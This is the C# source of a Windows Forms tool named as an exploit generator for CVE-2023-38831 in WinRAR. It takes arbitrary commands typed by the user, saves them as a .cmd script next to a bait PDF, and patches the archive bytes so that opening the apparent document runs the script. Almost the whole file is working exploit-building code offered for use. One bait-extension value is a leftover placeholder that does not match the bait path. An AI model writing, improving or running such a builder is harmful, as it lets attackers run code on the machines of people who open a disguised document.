using System.IO.Compression;
using System.Text;

namespace CVE_2023_38831_Exploit_Generator
{
    public partial class Form1 : Form
    {
        string selectedFolderPath = string.Empty;
        string selectedFileDestPath = string.Empty;

        public Form1()
        {
            InitializeComponent();
        }

        private void buttonSelectFolder_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog folderDialog = new FolderBrowserDialog())
            {
                // Configura las propiedades del FolderBrowserDialog
                folderDialog.Description = "Selecciona una carpeta";
                folderDialog.RootFolder = Environment.SpecialFolder.Desktop;
                folderDialog.ShowNewFolderButton = true; // Habilita la opción de crear una nueva carpeta

                // Muestra el diálogo y espera a que el usuario seleccione una carpeta
                DialogResult result = folderDialog.ShowDialog();

                if (result == DialogResult.OK)
                {
                    // Obtiene la carpeta seleccionada por el usuario
                    selectedFolderPath = folderDialog.SelectedPath;

                    // Haz lo que desees con la ruta de la carpeta seleccionada
                    MessageBox.Show($"El contenido de la carpeta seleccionada sera comprimida: {selectedFolderPath}");
                    textBoxFolderOrigin.Text = selectedFolderPath;
                }
            }
        }

        private void buttonSelectDest_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                // Configura las propiedades del SaveFileDialog
                saveFileDialog.Filter = "Archivo RAR (*.rar)|*.rar";
                saveFileDialog.Title = "Guardar archivo como...";
                saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                // Muestra el diálogo y espera a que el usuario seleccione una ubicación y nombre de archivo
                DialogResult result = saveFileDialog.ShowDialog();

                if (result == DialogResult.OK)
                {
                    // Obtiene la ruta completa del archivo seleccionado
                    selectedFileDestPath = saveFileDialog.FileName;

                    // Haz lo que desees con la ruta del archivo, por ejemplo, guardar datos en ese archivo
                    // En este ejemplo, simplemente mostramos un mensaje
                    MessageBox.Show($"Nombre del archivo: {selectedFileDestPath}");
                    textBoxFileDest.Text = selectedFileDestPath;
                }
            }
        }

        private void buttonGenerateExploit_Click(object sender, EventArgs e)
        {
            string BAIT_NAME = "C:/Users/elefa/OneDrive/Documents/Information Security Docs/Information Security Manual.pdf";
            string SCRIPT_NAME = "generateScriptFile.bat";
            string OUTPUT_NAME = selectedFileDestPath;
            string TEMPLATE_NAME = "TEMPLATE";

            File.WriteAllText(SCRIPT_NAME, textBoxCommands.Text);



            Console.WriteLine("BAIT_NAME: " + BAIT_NAME);
            Console.WriteLine("SCRIPT_NAME: " + SCRIPT_NAME);
            Console.WriteLine("OUTPUT_NAME: " + OUTPUT_NAME);

            if (Directory.Exists(TEMPLATE_NAME))
            {
                Directory.Delete(TEMPLATE_NAME, true);
            }
            Directory.CreateDirectory(TEMPLATE_NAME);
            string d = Path.Combine(TEMPLATE_NAME, BAIT_NAME + "A");
            if (!Directory.Exists(d))
            {
                Directory.CreateDirectory(d);
            }

            File.Copy(SCRIPT_NAME, Path.Combine(d, BAIT_NAME + "A.cmd"));
            File.Copy(BAIT_NAME, Path.Combine(TEMPLATE_NAME, BAIT_NAME + "B"));

            // Uncomment this section if you want to check if OUTPUT_NAME already exists
            //if (File.Exists(OUTPUT_NAME))
            //{
            //    Console.WriteLine("!!! dir " + OUTPUT_NAME + " exists, delete it first");
            //    return;
            //}

            ZipFile.CreateFromDirectory(TEMPLATE_NAME, TEMPLATE_NAME + ".zip");

            byte[] content;

            using (FileStream fs = new FileStream(TEMPLATE_NAME + ".zip", FileMode.Open, FileAccess.ReadWrite))
            {
                content = new byte[fs.Length];
                fs.Read(content, 0, content.Length);
            }

            string BAIT_EXT = "YourBaitExtension"; // Replace with your actual bait extension

            content = ReplaceBytes(content, Encoding.Default.GetBytes(BAIT_EXT + "A"), Encoding.Default.GetBytes(BAIT_EXT + " "));
            content = ReplaceBytes(content, Encoding.Default.GetBytes(BAIT_EXT + "B"), Encoding.Default.GetBytes(BAIT_EXT + " "));

            File.Delete(TEMPLATE_NAME + ".zip");

            using (FileStream fs = new FileStream(OUTPUT_NAME, FileMode.Create, FileAccess.Write))
            {
                fs.Write(content, 0, content.Length);
            }

            Console.WriteLine("ok..");
        }

        static byte[] ReplaceBytes(byte[] input, byte[] search, byte[] replacement)
        {
            MemoryStream ms = new MemoryStream();

            for (int i = 0; i < input.Length; i++)
            {
                bool match = true;

                for (int j = 0; j < search.Length; j++)
                {
                    if (i + j >= input.Length || input[i + j] != search[j])
                    {
                        match = false;
                        break;
                    }
                }

                if (match)
                {
                    ms.Write(replacement, 0, replacement.Length);
                    i += search.Length - 1;
                }
                else
                {
                    ms.WriteByte(input[i]);
                }
            }

            return ms.ToArray();
        }
    }
}